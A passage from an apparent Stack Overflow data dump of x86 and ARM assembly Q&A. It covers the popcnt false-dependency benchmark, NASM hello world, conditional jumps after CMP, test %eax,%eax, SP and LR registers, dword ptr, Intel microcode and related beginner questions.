<li>GCC 4.6.3: <code>g++ popcnt.cpp -std=c++0x -O3 -save-temps -march=native</code></li>
<li>Ubuntu 12</li>
</ul>

<p>Different Registers: <strong>18.6195 GB/s</strong></p>

<pre><code>.L4:
    movq    (%rbx,%rax,8), %r8
    movq    8(%rbx,%rax,8), %r9
    movq    16(%rbx,%rax,8), %r10
    movq    24(%rbx,%rax,8), %r11
    addq    $4, %rax

    popcnt %r8, %r8
    add    %r8, %rdx
    popcnt %r9, %r9
    add    %r9, %rcx
    popcnt %r10, %r10
    add    %r10, %rdi
    popcnt %r11, %r11
    add    %r11, %rsi

    cmpq    $131072, %rax
    jne .L4
</code></pre>

<p>Same Register: <strong>8.49272 GB/s</strong></p>

<pre><code>.L9:
    movq    (%rbx,%rdx,8), %r9
    movq    8(%rbx,%rdx,8), %r10
    movq    16(%rbx,%rdx,8), %r11
    movq    24(%rbx,%rdx,8), %rbp
    addq    $4, %rdx

    # This time reuse ""rax"" for all the popcnts.
    popcnt %r9, %rax
    add    %rax, %rcx
    popcnt %r10, %rax
    add    %rax, %rsi
    popcnt %r11, %rax
    add    %rax, %r8
    popcnt %rbp, %rax
    add    %rax, %rdi

    cmpq    $131072, %rdx
    jne .L9
</code></pre>

<p>Same Register with broken chain: <strong>17.8869 GB/s</strong></p>

<pre><code>.L14:
    movq    (%rbx,%rdx,8), %r9
    movq    8(%rbx,%rdx,8), %r10
    movq    16(%rbx,%rdx,8), %r11
    movq    24(%rbx,%rdx,8), %rbp
    addq    $4, %rdx

    # Reuse ""rax"" for all the popcnts.
    xor    %rax, %rax    # Break the cross-iteration dependency by zeroing ""rax"".
    popcnt %r9, %rax
    add    %rax, %rcx
    popcnt %r10, %rax
    add    %rax, %rsi
    popcnt %r11, %rax
    add    %rax, %r8
    popcnt %rbp, %rax
    add    %rax, %rdi

    cmpq    $131072, %rdx
    jne .L14
</code></pre>

<hr>

<p><strong>So what went wrong with the compiler?</strong></p>

<p>It seems that neither GCC nor Visual Studio are aware that <code>popcnt</code> has such a false dependency. Nevertheless, these false dependencies aren't uncommon. It's just a matter of whether the compiler is aware of it.</p>

<p><code>popcnt</code> isn't exactly the most used instruction. So it's not really a surprise that a major compiler could miss something like this. There also appears to be no documentation anywhere that mentions this problem. If Intel doesn't disclose it, then nobody outside will know until someone runs into it by chance.</p>

<p>(<strong>Update:</strong> <a href=""https://gcc.gnu.org/bugzilla/show_bug.cgi?id=62011#c13"">As of version 4.9.2</a>, GCC is aware of this false-dependency and generates code to compensate it when optimizations are enabled. Major compilers from other vendors, including Clang, MSVC, and even Intel's own ICC are not yet aware of this microarchitectural erratum and will not emit code that compensates for it.)</p>

<p><strong>Why does the CPU have such a false dependency?</strong></p>

<p>We can only speculate, but it's likely that Intel has the same handling for a lot of two-operand instructions. Common instructions like <code>add</code>, <code>sub</code> take two operands both of which are inputs. So Intel probably shoved <code>popcnt</code> into the same category to keep the processor design simple.</p>

<p>AMD processors do not appear to have this false dependency.</p>

<hr>

<p>The full test code is below for reference:</p>

<pre><code>#include &lt;iostream&gt;
#include &lt;chrono&gt;
#include &lt;x86intrin.h&gt;

int main(int argc, char* argv[]) {

   using namespace std;
   uint64_t size=1&lt;&lt;20;

   uint64_t* buffer = new uint64_t[size/8];
   char* charbuffer=reinterpret_cast&lt;char*&gt;(buffer);
   for (unsigned i=0;i&lt;size;++i) charbuffer[i]=rand()%256;

   uint64_t count,duration;
   chrono::time_point&lt;chrono::system_clock&gt; startP,endP;
   {
      uint64_t c0 = 0;
      uint64_t c1 = 0;
      uint64_t c2 = 0;
      uint64_t c3 = 0;
      startP = chrono::system_clock::now();
      for( unsigned k = 0; k &lt; 10000; k++){
         for (uint64_t i=0;i&lt;size/8;i+=4) {
            uint64_t r0 = buffer[i + 0];
            uint64_t r1 = buffer[i + 1];
            uint64_t r2 = buffer[i + 2];
            uint64_t r3 = buffer[i + 3];
            __asm__(
                ""popcnt %4, %4  \n\t""
                ""add %4, %0     \n\t""
                ""popcnt %5, %5  \n\t""
                ""add %5, %1     \n\t""
                ""popcnt %6, %6  \n\t""
                ""add %6, %2     \n\t""
                ""popcnt %7, %7  \n\t""
                ""add %7, %3     \n\t""
                : ""+r"" (c0), ""+r"" (c1), ""+r"" (c2), ""+r"" (c3)
                : ""r""  (r0), ""r""  (r1), ""r""  (r2), ""r""  (r3)
            );
         }
      }
      count = c0 + c1 + c2 + c3;
      endP = chrono::system_clock::now();
      duration=chrono::duration_cast&lt;std::chrono::nanoseconds&gt;(endP-startP).count();
      cout &lt;&lt; ""No Chain\t"" &lt;&lt; count &lt;&lt; '\t' &lt;&lt; (duration/1.0E9) &lt;&lt; "" sec \t""
            &lt;&lt; (10000.0*size)/(duration) &lt;&lt; "" GB/s"" &lt;&lt; endl;
   }
   {
      uint64_t c0 = 0;
      uint64_t c1 = 0;
      uint64_t c2 = 0;
      uint64_t c3 = 0;
      startP = chrono::system_clock::now();
      for( unsigned k = 0; k &lt; 10000; k++){
         for (uint64_t i=0;i&lt;size/8;i+=4) {
            uint64_t r0 = buffer[i + 0];
            uint64_t r1 = buffer[i + 1];
            uint64_t r2 = buffer[i + 2];
            uint64_t r3 = buffer[i + 3];
            __asm__(
                ""popcnt %4, %%rax   \n\t""
                ""add %%rax, %0      \n\t""
                ""popcnt %5, %%rax   \n\t""
                ""add %%rax, %1      \n\t""
                ""popcnt %6, %%rax   \n\t""
                ""add %%rax, %2      \n\t""
                ""popcnt %7, %%rax   \n\t""
                ""add %%rax, %3      \n\t""
                : ""+r"" (c0), ""+r"" (c1), ""+r"" (c2), ""+r"" (c3)
                : ""r""  (r0), ""r""  (r1), ""r""  (r2), ""r""  (r3)
                : ""rax""
            );
         }
      }
      count = c0 + c1 + c2 + c3;
      endP = chrono::system_clock::now();
      duration=chrono::duration_cast&lt;std::chrono::nanoseconds&gt;(endP-startP).count();
      cout &lt;&lt; ""Chain 4   \t""  &lt;&lt; count &lt;&lt; '\t' &lt;&lt; (duration/1.0E9) &lt;&lt; "" sec \t""
            &lt;&lt; (10000.0*size)/(duration) &lt;&lt; "" GB/s"" &lt;&lt; endl;
   }
   {
      uint64_t c0 = 0;
      uint64_t c1 = 0;
      uint64_t c2 = 0;
      uint64_t c3 = 0;
      startP = chrono::system_clock::now();
      for( unsigned k = 0; k &lt; 10000; k++){
         for (uint64_t i=0;i&lt;size/8;i+=4) {
            uint64_t r0 = buffer[i + 0];
            uint64_t r1 = buffer[i + 1];
            uint64_t r2 = buffer[i + 2];
            uint64_t r3 = buffer[i + 3];
            __asm__(
                ""xor %%rax, %%rax   \n\t""   // &lt;--- Break the chain.
                ""popcnt %4, %%rax   \n\t""
                ""add %%rax, %0      \n\t""
                ""popcnt %5, %%rax   \n\t""
                ""add %%rax, %1      \n\t""
                ""popcnt %6, %%rax   \n\t""
                ""add %%rax, %2      \n\t""
                ""popcnt %7, %%rax   \n\t""
                ""add %%rax, %3      \n\t""
                : ""+r"" (c0), ""+r"" (c1), ""+r"" (c2), ""+r"" (c3)
                : ""r""  (r0), ""r""  (r1), ""r""  (r2), ""r""  (r3)
                : ""rax""
            );
         }
      }
      count = c0 + c1 + c2 + c3;
      endP = chrono::system_clock::now();
      duration=chrono::duration_cast&lt;std::chrono::nanoseconds&gt;(endP-startP).count();
      cout &lt;&lt; ""Broken Chain\t""  &lt;&lt; count &lt;&lt; '\t' &lt;&lt; (duration/1.0E9) &lt;&lt; "" sec \t""
            &lt;&lt; (10000.0*size)/(duration) &lt;&lt; "" GB/s"" &lt;&lt; endl;
   }

   free(charbuffer);
}
</code></pre>

<hr>

<p>An equally interesting benchmark can be found here: <a href=""http://pastebin.com/kbzgL8si"">http://pastebin.com/kbzgL8si</a>
<br>
This benchmark varies the number of <code>popcnt</code>s that are in the (false) dependency chain.</p>

<pre><code>False Chain 0:  41959360000 0.57748 sec     18.1578 GB/s
False Chain 1:  41959360000 0.585398 sec    17.9122 GB/s
False Chain 2:  41959360000 0.645483 sec    16.2448 GB/s
False Chain 3:  41959360000 0.929718 sec    11.2784 GB/s
False Chain 4:  41959360000 1.23572 sec     8.48557 GB/s
</code></pre>
","25089720"
"How to write hello world in assembler under Windows?","98344","","<p>I wanted to write something basic in assembly under Windows, I'm using NASM, but I can't get anything working. </p>

<p>How to write and compile hello world without the help of C functions on Windows?</p>
","<p><a href=""http://web.archive.org/web/20120414223112/http://www.cs.lmu.edu/~ray/notes/nasmexamples/"" rel=""noreferrer"">NASM examples</a>.</p>

<pre><code>; ----------------------------------------------------------------------------
; helloworld.asm
;
; This is a Win32 console program that writes ""Hello, World"" on one line and
; then exits.  It needs to be linked with a C library.
; ----------------------------------------------------------------------------

    global  _main
    extern  _printf

    section .text
_main:
    push    message
    call    _printf
    add     esp, 4
    ret
message:
    db  'Hello, World', 10, 0
</code></pre>

<p>Then run</p>

<pre><code>nasm -fwin32 helloworld.asm
gcc helloworld.obj
a
</code></pre>

<p>There's also <a href=""http://web.archive.org/web/20100529113659/http://home.comcast.net/~fbkotler/clueless.html"" rel=""noreferrer"">The Clueless Newbies Guide to Hello World in Nasm</a> without the use of a C library. Then the code would look like this.</p>

<pre><code>org 100h
mov dx,msg
mov ah,9
int 21h
mov ah,4Ch
int 21h
msg db 'Hello, World!',0Dh,0Ah,'$'
</code></pre>

<p>Good luck.</p>
","1023600"
"Is < faster than <=?","97845","","<p>I'm reading a book where the author says that <code>if( a &lt; 901 )</code> is faster than <code>if( a &lt;= 900 )</code>. </p>

<p>Not exactly as in this simple example, but there are slight performance changes on loop complex code. I suppose this has to do something with generated machine code in case it's even true.</p>
","<p>No, it will not be faster on most architectures. You didn't specify, but on x86, all of the integral comparisons will be typically implemented in two machine instructions:</p>

<ul>
<li>A <code>test</code> or <code>cmp</code> instruction, which sets <code>EFLAGS</code></li>
<li>And a <a href=""http://www.unixwiz.net/techtips/x86-jumps.html""><code>Jcc</code> (jump) instruction</a>, depending on the comparison type (and code layout):
<ul>
<li><code>jne</code> - Jump if not equal --> <code>ZF = 0</code></li>
<li><code>jz</code> - Jump if zero (equal) --> <code>ZF = 1</code></li>
<li><code>jg</code> - Jump if greater --> <code>ZF = 0 and SF = OF</code></li>
<li>(etc...)</li>
</ul></li>
</ul>

<hr>

<p><strong>Example</strong> (Edited for brevity) Compiled with <code>$ gcc -m32 -S -masm=intel test.c</code></p>

<pre class=""lang-c prettyprint-override""><code>    if (a &lt; b) {
        // Do something 1
    }
</code></pre>

<p>Compiles to:</p>

<pre class=""lang-none prettyprint-override""><code>    mov     eax, DWORD PTR [esp+24]      ; a
    cmp     eax, DWORD PTR [esp+28]      ; b
    jge     .L2                          ; jump if a is &gt;= b
    ; Do something 1
.L2:
</code></pre>

<p>And</p>

<pre class=""lang-c prettyprint-override""><code>    if (a &lt;= b) {
        // Do something 2
    }
</code></pre>

<p>Compiles to:</p>

<pre class=""lang-none prettyprint-override""><code>    mov     eax, DWORD PTR [esp+24]      ; a
    cmp     eax, DWORD PTR [esp+28]      ; b
    jg      .L5                          ; jump if a is &gt; b
    ; Do something 2
.L5:
</code></pre>

<p>So the only difference between the two is a <code>jg</code> versus a <code>jge</code> instruction. The two will take the same amount of time.</p>

<hr>

<p>I'd like to address the comment that nothing indicates that the different jump instructions take the same amount of time.  This one is a little tricky to answer, but here's what I can give: In the <a href=""http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html"">Intel Instruction Set Reference</a>, they are all grouped together under one common instruction, <code>Jcc</code> (Jump if condition is met). The same grouping is made together under the <a href=""http://www.intel.com/content/www/us/en/architecture-and-technology/64-ia-32-architectures-optimization-manual.html"">Optimization Reference Manual</a>, in Appendix C. Latency and Throughput.</p>

<blockquote>
  <p><strong>Latency</strong> — The number of clock cycles that are required for the
  execution core to  complete the execution of all of the μops that form
  an instruction.</p>
  
  <p><strong>Throughput</strong> — The number of clock cycles required to
  wait before the issue  ports are free to accept the same instruction
  again. For many instructions, the  throughput of an instruction can be
  significantly less than its latency</p>
</blockquote>

<p>The values for <code>Jcc</code> are:</p>

<pre class=""lang-none prettyprint-override""><code>      Latency   Throughput
Jcc     N/A        0.5
</code></pre>

<p>with the following footnote on <code>Jcc</code>:</p>

<blockquote>
  <p>7) Selection of conditional jump instructions should be based on the recommendation of section Section 3.4.1, “Branch Prediction Optimization,” to improve the  predictability of branches. When branches are predicted successfully, the latency of <code>jcc</code> is effectively zero.</p>
</blockquote>

<p>So, nothing in the Intel docs ever treats one <code>Jcc</code> instruction any differently from the others.</p>

<p>If one thinks about the actual circuitry used to implement the instructions, one can assume that there would be simple AND/OR gates on the different bits in <code>EFLAGS</code>, to determine whether the conditions are met. There is then, no reason that an instruction testing two bits should take any more or less time than one testing only one (Ignoring gate propagation delay, which is much less than the clock period.)</p>

<hr>

<p><strong>Edit: Floating Point</strong></p>

<p>This holds true for x87 floating point as well:  (Pretty much same code as above, but with <code>double</code> instead of <code>int</code>.)</p>

<pre class=""lang-none prettyprint-override""><code>        fld     QWORD PTR [esp+32]
        fld     QWORD PTR [esp+40]
        fucomip st, st(1)              ; Compare ST(0) and ST(1), and set CF, PF, ZF in EFLAGS
        fstp    st(0)
        seta    al                     ; Set al if above (CF=0 and ZF=0).
        test    al, al
        je      .L2
        ; Do something 1
.L2:

        fld     QWORD PTR [esp+32]
        fld     QWORD PTR [esp+40]
        fucomip st, st(1)              ; (same thing as above)
        fstp    st(0)
        setae   al                     ; Set al if above or equal (CF=0).
        test    al, al
        je      .L5
        ; Do something 2
.L5:
        leave
        ret
</code></pre>
","12135533"
"The point of test %eax %eax","92917","","<blockquote>
  <p><strong>Possible Duplicate:</strong><br>
  <a href=""https://stackoverflow.com/questions/147173/x86-assembly-testl-eax-against-eax"">x86 Assembly - ‘testl’ eax against eax?</a>  </p>
</blockquote>



<p>I'm very very new to assembly language programming, and I'm currently trying to read the assembly language generated from a binary.  I've run across </p>

<pre><code> test   %eax,%eax
</code></pre>

<p>or <code>test %rdi, %rdi</code>, etc. etc. I'm very confused as to what this does.  Isn't the values in <code>%eax, %eax</code> the same?  What is it testing?  I read somewhere that it is doing the <code>AND</code> operation.....but since they are the same value, wouldn't it just return <code>%eax</code>?</p>

<p>The following is just one instance where I found this usage:</p>

<pre><code>   400e6e:       85 c0                   test   %eax,%eax
   400e70:       74 05                   je     400e77 &lt;phase_1+0x23&gt;
</code></pre>

<p>I thought <code>je</code> jumps if the two values being compared are equal......well, because  <code>%eax</code> is well, itself, in what situation would we NOT jump?</p>

<p>I'm a beginner to programming in general, so I'd appreciate it very much if someone could explain this to me.  Thanks!</p>
","<p><code>CMP</code> subtracts the operands and sets the flags. Namely, it sets the zero flag if the difference is zero (operands are equal).</p>

<p><code>TEST</code> sets the zero flag, <code>ZF</code>, when the result of the AND operation is zero. If two operands are equal, their bitwise AND is zero when both are zero. <code>TEST</code> also sets the sign flag, <code>SF</code>, when the most significant bit is set in the result, and the parity flag, <code>PF</code>, when the number of set bits is even.</p>

<p><code>JE</code> [Jump if Equals] tests the zero flag and jumps if the flag is set. <code>JE</code> is an alias of <code>JZ</code> [Jump if Zero] so the disassembler cannot select one based on the opcode. <code>JE</code> is named such because the zero flag is set if the arguments to <code>CMP</code> are equal.</p>

<p>So,</p>

<pre><code>TEST %eax, %eax
JE   400e77 &lt;phase_1+0x23&gt;
</code></pre>

<p>jumps if the <code>%eax</code> is zero.</p>
","13064985"
"What are SP (stack) and LR in ARM?","91523","","<p>I am reading definitions over and over again and I still not getting what are SP and LR in ARM? I understand PC (it shows next instruction's address), SP and LR probably are similar, but I just don't get what it is. Could you please help me?</p>

<p><strong>edit:</strong> if you could explain it with examples, it would be superb.</p>

<p><strong>edit:</strong> finally figured out what LR is for, still not getting what SP is for.</p>
","<p>LR is <a href=""http://en.wikipedia.org/wiki/Link_register"" rel=""noreferrer"">link register</a> used to hold the return address for a function call.</p>

<p>SP is stack pointer.  The stack is generally used to hold ""automatic"" variables and context/parameters across function calls.  Conceptually you can think of the ""stack"" as a place where you ""pile"" your data.  You keep ""stacking"" one piece of data over the other and the stack pointer tells you how ""high"" your ""stack"" of data is.  You can remove data from the ""top"" of the ""stack"" and make it shorter.</p>

<p>From the ARM architecture reference:</p>

<blockquote>
  <p><strong>SP, the Stack Pointer</strong></p>
  
  <p>Register R13 is used as a pointer to the active stack.</p>
  
  <p>In Thumb code, most instructions cannot access SP. The only
  instructions that can access SP are those designed to use SP as a
  stack pointer. The use of SP for any purpose other than as a stack
  pointer is deprecated. Note Using SP for any purpose other than as a
  stack pointer is likely to break the requirements of operating
  systems, debuggers, and other software systems, causing them to
  malfunction.</p>
  
  <p><strong>LR, the Link Register</strong></p>
  
  <p>Register R14 is used to store the return address from a subroutine. At
  other times, LR can be used for other purposes.</p>
  
  <p>When a BL or BLX instruction performs a subroutine call, LR is set to
  the subroutine return address. To perform a subroutine return, copy LR
  back to the program counter. This is typically done in one of two
  ways, after entering the subroutine with a BL or BLX instruction:</p>
  
  <p>• Return with a BX LR instruction. </p>
  
  <p>• On subroutine entry, store LR to
  the stack with an instruction of the form: PUSH {,LR} and
  use a matching instruction to return: POP {,PC} ...</p>
</blockquote>

<p><a href=""http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.dui0801d/dom1359731145503.html"" rel=""noreferrer"">This link gives an example of a trivial subroutine.</a></p>

<p><a href=""http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.dui0801d/dom1359731145503.html"" rel=""noreferrer"">Here is an example of how registers are saved on the stack prior to a call and then popped back to restore their content.</a></p>
","8236974"
"Assembly - JG/JNLE/JL/JNGE after CMP","90994","","<p>I don't understand the <code>JG/JNLE/JL/JNGE</code> instructions, which come after CMP.</p>

<p>for example, If I have:</p>

<pre><code>CMP al,dl
jg label1
</code></pre>

<p>When <code>al=101; dl =200</code>.</p>

<p>On what we ask the <code>jg</code>? Is it on <code>al&gt;dl</code>? or <code>al-dl&gt;0</code>?</p>

<p>Same prolbem on the next code:</p>

<pre><code>test al,dl
jg label1
</code></pre>

<p>I don't understand what we compare, and on what we ask the ""<code>jg</code>"".</p>

<p>In other words, I don't understand when we would jump to label1, and when we wouldn't.</p>

<p>Thanks.</p>
","<p>When you do a <code>cmp a,b</code>, the flags are set as if you had calculated <code>a - b</code>.</p>

<p>Then the <code>jmp</code>-type instructions check those flags to see if the jump should be made.</p>

<p>In other words, the first block of code you have (with my comments added):</p>

<pre><code>cmp al,dl     ; set flags based on the comparison
jg label1     ; then jump based on the flags
</code></pre>

<p>would jump to <code>label1</code> if and only if <code>al</code> was greater than <code>dl</code>.</p>

<p>You're probably better off thinking of it as <code>al &gt; dl</code> but the two choices you have there are mathematically equivalent:</p>

<pre><code>al &gt; dl
al - dl &gt; dl - dl (subtract dl from both sides)
al - dl &gt; 0       (cancel the terms on the right hand side)
</code></pre>

<p>You need to be careful when using <code>jg</code> inasmuch as it assumes your values were signed. So, if you compare the <em>bytes</em> 101 (101 in two's complement) with 200 (-56 in two's complement), the former will actually be greater. If that's not what was desired, you should use the equivalent unsigned comparison.</p>

<p>See <a href=""http://unixwiz.net/techtips/x86-jumps.html"">here</a> for more detail on jump selection, reproduced below for completeness. First the ones where signed-ness is not appropriate:</p>

<pre><code>+--------+------------------------------+-------------+--------------------+
|Instr   | Description                  | signed-ness | Flags              |
+--------+------------------------------+-------------+--------------------+
| JO     | Jump if overflow             |             | OF = 1             |
+--------+------------------------------+-------------+--------------------+
| JNO    | Jump if not overflow         |             | OF = 0             |
+--------+------------------------------+-------------+--------------------+
| JS     | Jump if sign                 |             | SF = 1             |
+--------+------------------------------+-------------+--------------------+
| JNS    | Jump if not sign             |             | SF = 0             |
+--------+------------------------------+-------------+--------------------+
| JE/    | Jump if equal                |             | ZF = 1             |
| JZ     | Jump if zero                 |             |                    |
+--------+------------------------------+-------------+--------------------+
| JNE/   | Jump if not equal            |             | ZF = 0             |
| JNZ    | Jump if not zero             |             |                    |
+--------+------------------------------+-------------+--------------------+
| JP/    | Jump if parity               |             | PF = 1             |
| JPE    | Jump if parity even          |             |                    |
+--------+------------------------------+-------------+--------------------+
| JNP/   | Jump if no parity            |             | PF = 0             |
| JPO    | Jump if parity odd           |             |                    |
+--------+------------------------------+-------------+--------------------+
| JCXZ/  | Jump if CX is zero           |             | CX = 0             |
| JECXZ  | Jump if ECX is zero          |             | ECX = 0            |
+--------+------------------------------+-------------+--------------------+
</code></pre>

<p>Then the unsigned ones:</p>

<pre><code>+--------+------------------------------+-------------+--------------------+
|Instr   | Description                  | signed-ness | Flags              |
+--------+------------------------------+-------------+--------------------+
| JB/    | Jump if below                | unsigned    | CF = 1             |
| JNAE/  | Jump if not above or equal   |             |                    |
| JC     | Jump if carry                |             |                    |
+--------+------------------------------+-------------+--------------------+
| JNB/   | Jump if not below            | unsigned    | CF = 0             |
| JAE/   | Jump if above or equal       |             |                    |
| JNC    | Jump if not carry            |             |                    |
+--------+------------------------------+-------------+--------------------+
| JBE/   | Jump if below or equal       | unsigned    | CF = 1 or ZF = 1   |
| JNA    | Jump if not above            |             |                    |
+--------+------------------------------+-------------+--------------------+
| JA/    | Jump if above                | unsigned    | CF = 0 and ZF = 0  |
| JNBE   | Jump if not below or equal   |             |                    |
+--------+------------------------------+-------------+--------------------+
</code></pre>

<p>And, finally, the signed ones:</p>

<pre><code>+--------+------------------------------+-------------+--------------------+
|Instr   | Description                  | signed-ness | Flags              |
+--------+------------------------------+-------------+--------------------+
| JL/    | Jump if less                 | signed      | SF &lt;&gt; OF           |
| JNGE   | Jump if not greater or equal |             |                    |
+--------+------------------------------+-------------+--------------------+
| JGE/   | Jump if greater or equal     | signed      | SF = OF            |
| JNL    | Jump if not less             |             |                    |
+--------+------------------------------+-------------+--------------------+
| JLE/   | Jump if less or equal        | signed      | ZF = 1 or SF &lt;&gt; OF |
| JNG    | Jump if not greater          |             |                    |
+--------+------------------------------+-------------+--------------------+
| JG/    | Jump if greater              | signed      | ZF = 0 and SF = OF |
| JNLE   | Jump if not less or equal    |             |                    |
+--------+------------------------------+-------------+--------------------+
</code></pre>
","9617990"
"x86 Assembly on a Mac","83543","","<p>Does anyone know of any good tools (I'm looking for IDEs) to write assembly on the Mac. Xcode is a little cumbersome to me.</p>

<p>Also, on the Intel Macs, can I use generic x86 asm?  Or is there a modified instruction set? Any information about post Intel.</p>

<p>Also: I know that on windows, asm can run in an emulated environment created by the OS to let the code think it's running on its own dedicated machine. Does OS X provide the same thing?</p>
","<p>After installing any version of Xcode targeting Intel-based Macs, you should be able to write assembly code.  Xcode is a suite of tools, only one of which is the IDE, so you don't have to use it if you don't want to.  (That said, if there are specific things you find clunky, please file a bug at <a href=""http://bugreport.apple.com/"" rel=""noreferrer"" title=""Apple&#39;s bug reporter"">Apple's bug reporter</a> - every bug goes to engineering.)  Furthermore, installing Xcode will install both the Netwide Assembler (NASM) and the GNU Assembler (GAS); that will let you use whatever assembly syntax you're most comfortable with.</p>

<p>You'll also want to take a look at the <a href=""https://developer.apple.com/library/mac/documentation/CompilerTools/Conceptual/LLVMCompilerOverview/index.html#//apple_ref/doc/uid/TP40010019"" rel=""noreferrer"" title=""Compiler &amp; Debugging Guides"">Compiler &amp; Debugging Guides</a>, because those document the calling conventions used for the various architectures that Mac OS X runs on, as well as how the binary format and the loader work.  The IA-32 (x86-32) calling conventions in particular may be slightly different from what you're used to.</p>

<p>Another thing to keep in mind is that the system call interface on Mac OS X is different from what you might be used to on DOS/Windows, Linux, or the other BSD flavors.  System calls aren't considered a stable API on Mac OS X; instead, you always go through libSystem.  That will ensure you're writing code that's portable from one release of the OS to the next.</p>

<p>Finally, keep in mind that Mac OS X runs across a pretty wide array of hardware - everything from the 32-bit Core Single through the high-end quad-core Xeon.  By coding in assembly you might not be optimizing as much as you think; what's optimal on one machine may be pessimal on another.  Apple regularly measures its compilers and tunes their output with the ""-Os"" optimization flag to be decent across its line, and there are extensive vector/matrix-processing libraries that you can use to get high performance with hand-tuned CPU-specific implementations.</p>

<p>Going to assembly for fun is great.  Going to assembly for speed is not for the faint of heart these days.</p>
","5756"
"What does `dword ptr` mean?","82293","","<p>Could someone explain what this means? (Intel Syntax, x86, Windows)</p>

<pre><code>and     dword ptr [ebp-4], 0
</code></pre>
","<p>The ""dword ptr"" part is called a size directive. <a href=""http://www.cs.virginia.edu/~evans/cs216/guides/x86.html"" rel=""noreferrer"">This page</a> explains them, but it wasn't possible to direct-link to the correct section.</p>

<p>Basically, it means ""the size of the target operand is 32 bits"", so this will bitwise-AND the 32-bit value at the address computed by taking the contents of the <code>ebp</code> register and subtracting four with 0.</p>
","2987916"
"Difference between JE/JNE and JZ/JNZ","81855","","<p>In x86 assembly code, are <code>JE</code> and <code>JNE</code> exactly the same as <code>JZ</code> and <code>JNZ</code>?</p>
","<p><code>JE</code> and <code>JZ</code> are just different names for exactly the same thing: a
conditional jump when <code>ZF</code> (the ""zero"" flag) is equal to 1.</p>

<p>(Similarly, <code>JNE</code> and <code>JNZ</code> are just different names for a conditional jump
when <code>ZF</code> is equal to 0.)</p>

<p>You <em>could</em> use them interchangeably, but you <em>should</em> use them depending on
what you are doing:</p>

<ul>
<li><p><code>JZ</code>/<code>JNZ</code> are more appropriate when you are explicitly testing
for something being equal to zero:</p>

<pre><code>dec  ecx
jz   counter_is_now_zero
</code></pre></li>
<li><p><code>JE</code> and <code>JNE</code> are more appropriate after a <code>CMP</code> instruction:</p>

<pre><code>cmp  edx, 42
je   the_answer_is_42
</code></pre>

<p>(A <code>CMP</code> instruction performs a subtraction, and throws the value of the result away, while keeping the flags; which is why you get <code>ZF=1</code> when the operands are equal
and <code>ZF=0</code> when they're not.)</p></li>
</ul>
","14267642"
"assembly to compare two numbers","80146","","<p>What is the assembler syntax to determine which of two numbers is greater?</p>

<p>What is the lower level (machine code) for it? Can we go even lower? Once we get to the bit level, what happens? How is it represented in 0's and 1's?</p>
","<p>It varies from assembler to assembler.
Most machines offer registers, which have symbolic names
like R1, or EAX (the Intel x86), and have instruction
names like ""CMP"" for compare.  And for a compare
instruction, you need another operand, sometimes
a register, sometimes a literal.  Often assemblers
allow comments to the right of instruction.</p>

<p>An instruction line looks like:</p>

<pre><code>&lt;opcode&gt;   &lt;register&gt; &lt;operand&gt;   ; comment
</code></pre>

<p>Your assembler may vary somewhat.</p>

<p>For the Microsoft X86 assembler, you can write:</p>

<p>CMP    EAX, 23     ; compare register EAX with the constant 23</p>

<p>or</p>

<p>CMP    EAX, XYZ    ; compare register EAX with contents of memory location named XYZ</p>

<p>Often one can write complex ""expressions"" in the operand field
that enable the instruction, if it has the capability, to address
memory in variety of ways.   But I think this answers your question.</p>
","1123412"
"What is Intel microcode?","79885","","<p>From what I've read it's used to fix bugs in the CPU without modifying the BIOS.
From my basic knowledge of Assembly I know that assembly instructions are split into microcodes internally by the CPU and executed accordingly. But intel somehow gives access to make some updates while the system is up and running.</p>

<p>Anyone has more info on them? Is there any documentation regarding what can it be done with microcodes and how can they be used?</p>

<hr>

<p>EDIT: 
I've read the wikipedia article: didn't figure out how can I write some on my own, and what uses it would have.</p>
","<p>In older times, microcode was heavily used in CPU: every single instruction was split into microcode. This enabled relatively complex instruction sets in modest CPU (consider that a <a href=""http://en.wikipedia.org/wiki/68000"" rel=""noreferrer"">Motorola 68000</a>, with its many operand modes and eight 32-bit registers, fits in 40000 transistors, whereas a single-core modern x86 will have more than a hundred <em>millions</em>). This is not true anymore. For performance reasons, most instructions are now ""hardwired"": their interpretation is performed by inflexible circuitry, outside of any microcode.</p>

<p>In a recent x86, it is plausible that some complex instructions such as <code>fsin</code> (which computes the sine function on a floating point value) are implemented with microcode, but simple instructions (including integer multiplication with <code>imul</code>) are not. This limits what can be achieved with custom microcode.</p>

<p>That being said, microcode format is not only very specific to the specific processor model (e.g. microcode for a Pentium III and a Pentium IV cannot be freely exchanged with eachother -- and, of course, using Intel microcode for an AMD processor is out of the question), but it is also a severely protected secret. Intel has published the method by which an operating system or a motherboard BIOS may update the microcode (it must be done after each hard reset; the update is kept in volatile RAM) but the microcode <em>contents</em> are undocumented. The <a href=""http://www.intel.com/Assets/PDF/manual/253668.pdf"" rel=""noreferrer"">Intel® 64 and IA-32 Architectures Software Developer’s Manual</a> (volume 3a) describes the update procedure (section 9.11 ""microcode update facilities"") but states that the actual microcode is ""encrypted"" and clock-full of checksums. The wording is vague enough that just about any kind of cryptographic protection may be hidden, but the bottom-line is that it is not currently possible, for people other than Intel, to write and try some custom microcode.</p>

<p>If the ""encryption"" does not include a digital (asymmetric) signature and/or if the people at Intel botched the protection system somehow, then it may be conceivable that some remarkable reverse-engineering effort <em>could</em> potentially enable one to produce such microcode, but, given the probably limited applicability (since most instructions are hardwired), chances are that this would not buy much, as far as programming power is concerned.</p>
","4369480"
"Printing out a number in assembly language?","79304","","<pre><code>mov al,10
add al,15
</code></pre>

<p>How do I print the value of '<strong>al</strong>'?</p>
","<p>Have you tried <a href=""http://spike.scu.edu.au/~barry/interrupts.html#ah02"" rel=""noreferrer""><code>int 21h</code> service 2</a>?  <code>DL</code> is the character to print.</p>

<pre><code>mov dl,'A' ; print 'A'
mov ah,2
int 21h
</code></pre>

<p>To print the integer value, you'll have to write a loop to decompose the integer to individual characters.  If you're okay with printing the value in hex, this is pretty trivial.</p>

<p>If you can't rely on DOS services, you might also be able to use the <a href=""http://en.wikipedia.org/wiki/INT_10"" rel=""noreferrer"">BIOS <code>int 10h</code></a> with <code>AL</code> set to <code>0Eh</code> or <code>0Ah</code>.</p>
","1922231"
"Compile/run assembler in Linux?","78021","","<p>I'm fairly new to Linux (Ubuntu 10.04) and a total novice to assembler. I was following some tutorials and I couldn't find anything specific to Linux.
So, my question is, what is a good package to compile/run assembler and what are the command line commands to compile/run for that package?</p>
